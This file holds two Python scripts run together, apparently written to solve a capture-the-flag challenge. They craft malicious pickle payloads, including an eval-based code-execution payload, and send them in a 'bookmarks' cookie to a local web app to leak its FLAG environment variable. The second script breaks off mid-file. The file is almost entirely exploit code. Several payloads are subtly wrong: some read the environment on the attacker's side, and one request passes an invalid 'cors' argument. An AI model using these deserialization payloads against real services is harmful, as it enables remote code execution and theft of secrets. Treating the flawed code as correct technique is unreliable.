import requests
import pickle
import base64

# The issue: bookmarks might need specific format with host/status attributes
# Looking at the original empty bookmark: gARdlC4= which decodes to an empty list []

# Findings from context: The app tracks "bookmark status" with host information
# Each bookmark likely needs to be a dict or object with certain fields

# Let's try creating a payload that mimics proper bookmark structure
# The bookmark probably needs: {'id': ..., 'host': ..., 'url': ..., 'status': ...}

target_url = "http://127.0.0.1:32962"

# Test 1: Create a dict with FLAG embedded
class DictExploit:
    def __reduce__(self):
        import os
        flag = os.environ.get('FLAG', 'NO_FLAG')
        # Return a dict structure that might display
        return (dict, (('value', flag),))

payload_dict = base64.b64encode(pickle.dumps(DictExploit(), protocol=4)).decode()
print(f"Dict payload: {payload_dict}")

# Test 2: Try tuple with FLAG
class TupleExploit:
    def __reduce__(self):
        import os
        flag = os.environ.get('FLAG', 'NO_FLAG')
        return (tuple, ((flag,),))

payload_tuple = base64.b64encode(pickle.dumps(TupleExploit(), protocol=4)).decode()
print(f"Tuple payload: {payload_tuple}")

# Test 3: Create object with __repr__ that returns FLAG
print("\n=== Testing representation ===")

class ReprExploit:
    def __reduce__(self):
        # When pickled and unpickled, create object with custom repr
        # This class's repr will show FLAG
        return (ReprObject, ())

class ReprObject:
    def __repr__(self):
        import os
        return f"FLAG_VALUE: {os.environ.get('FLAG', 'NOT_FOUND')}"

payload_repr = base64.b64encode(pickle.dumps(ReprExploit(), protocol=4)).decode()
print(f"Repr payload: {payload_repr}")

cookies = {'bookmarks': payload_repr}
response = requests.get(f"{target_url}/list", cookies=cookies, timeout=10)
print(f"Status: {response.status_code}")
print(f"Response: {response.text}")

# Test 4: Try to break something to see error output
print("\n=== Triggering error for debugging ===")

class ErrorExploit:
    def __reduce__(self):
        # This will cause error during deserialization
        raise Exception("FLAG=" + __import__('os').environ.get('FLAG', 'NONE'))

try:
    payload_error = base64.b64encode(pickle.dumps(ErrorExploit(), protocol=4)).decode()
    cookies = {'bookmarks': payload_error}
    response = requests.get(f"{target_url}/list", cookies=cookies, timeout=10)
    print(f"Status: {response.status_code}")
    if response.status_code == 500:
        print("Got 500 error - might reveal info!")
        print(f"Response: {response.text}")
except Exception as e:
    print(f"Error in pickle creation: {e}")

# Test 5: Maybe just print FLAG to server's stdout/stderr
print("\n=== Trying to print FLAG to server output ===")

class PrintExploit:
    def __reduce__(self):
        # This should print FLAG to server's console
        import os
        return (print, (os.environ.get('FLAG', 'PRINT_NO_FLAG'),))

payload_print = base64.b64encode(pickle.dumps(PrintExploit(), protocol=4)).decode()
print(f"Print payload: {payload_print}")

cookies = {'bookmarks': payload_print}
response = requests.get(f"{target_url}/list", cookies=cookies, timeout=10)
print(f"Status: {response.status_code}")

# Then check if it was processed differently
response2 = requests.get(f"{target_url}/list", cors={'bookmarks': 'gARdlC4='}, timeout=10)
print(f"Empty list status: {response2.status_code}")
import pickle
import base64
import os

# Objective: Create a pickle that, when unpickled SERVER-SIDE, reads os.environ['FLAG']
# The hint says "env is key" meaning we need to access environment variables

# Approach 1: __reduce__ returning (os.getenv, ('FLAG',))
class Exploit1:
    def __reduce__(self):
        import os
        return (os.getenv, ('FLAG', 'DEFAULT_VALUE'))

# Create and encode payload
exploit_obj = Exploit1()
pickled = pickle.dumps(exploit_obj, protocol=4)
encoded_payload1 = base64.b64encode(pickled).decode()

print(f"Payload 1 (os.getenv): {encoded_payload1}")
print()

# Approach 2: Using eval to execute arbitrary code and get the FLAG
class Exploit2:
    def __reduce__(self):
        # Eval will execute this expression when unpickled
        return (eval, ("__import__('os').environ.get('FLAG', 'NOT_FOUND')",))

exploit_obj2 = Exploit2()
pickled2 = pickle.dumps(exploit_obj2, protocol=4)
encoded_payload2 = base64.b64encode(pickled2).decode()

print(f"Payload 2 (eval): {encoded_payload2}")
print()

# Approach 3: Direct dict access for dict-type result
class Exploit3:
    def __reduce__(self):
        # Returns a dict with FLAG value
        return (dict, ([('flag', __import__('os').environ.get('FLAG', 'NO_FLAG'))],))

exploit_obj3 = Exploit3()
pickled3 = pickle.dumps(exploit_obj3, protocol=4)
encoded_payload3 = base64.b64encode(pickled3).decode()

print(f"Payload 3 (dict): {encoded_payload3}")
print()

# Local verification - test that payload works
print("=== Local Verification ===")
os.environ['FLAG'] = 'TEST_SECRET_FLAG_12345'

# Test payload 1
decoded1 = base64.b64decode(encoded_payload1)
result1 = pickle.loads(decoded1)
print(f"Payload 1 result: {result1}")

# Test payload 2
